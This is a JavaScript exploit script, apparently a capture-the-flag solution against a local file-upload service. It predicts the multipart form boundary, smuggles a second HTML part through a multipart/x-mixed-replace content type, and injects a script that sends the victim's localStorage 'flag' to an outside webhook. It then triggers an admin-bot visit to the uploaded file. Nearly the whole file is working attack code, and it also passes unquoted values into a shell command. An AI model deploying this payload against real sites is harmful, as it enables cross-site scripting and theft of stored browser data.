import childProcess from "child_process";

const url = "http://localhost:1337";
const webhook = "url";

const boundaryIntro = "------formdata-undici-0";

// https://bugzilla.mozilla.org/show_bug.cgi?id=1864434
let payload = `--BOUNDARY
Content-Type: text/html
Content-Security-Policy: script-src-elem 'unsafe-inline';

<script>
location = \`${webhook}?c\${localStorage.getItem('flag')}.\`
</script>
--BOUNDARY--\r\n{boundaryIntro}{boundary}\r\nContent-Disposition: form-data; name="content_type"\r\n\r\nmultipart/x-mixed-replace; boundary=BOUNDARY`;
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

async function uploadFiles() {
  for (let i = 0; i < 6; i++) {
    const fd = new FormData();
    fd.append("file", "any");

    fetch(url, {
      method: "POST",
      body: fd,
    });
    await sleep(1200);
  }
}

function predict(vals) {
  let out = childProcess
    .execSync(`python3 predict.py '${JSON.stringify(vals)}'`)
    .toString()
    .trim();

  console.log("PREDICT:", out);
  return out;
}

async function getIds() {
  let res = await fetch(`${url}/files`);
  res = await res.json();
  let ids = []
  for (let f of res['files']) {
    ids.push(f['id'])
  }
  return ids.slice(0,6)
}

function buildBoundary(id) {
  return id.toString().slice(0,-1).padStart(11, 0)
}

async function main() {
  await uploadFiles();
  const ids = await getIds();
  const boundary = buildBoundary(predict(ids));
  console.log('boundary: ', boundary)
  payload = payload.replace('{boundaryIntro}', boundaryIntro).replace('{boundary}', boundary);

  try {
    const formData = new FormData();
    formData.append('file', new Blob([payload], { type: 'text/html' }), 'exploit.html');

    const r = await fetch(`${url}`, {
      method: `POST`,
      body: formData
    });

    let fid = r.url.split('/').at(-1);
    
    await fetch(`${url}/visit?id=${fid}`);

    console.log('visited ', fid)
  } catch (e) {
  }
}

main().catch(console.error);
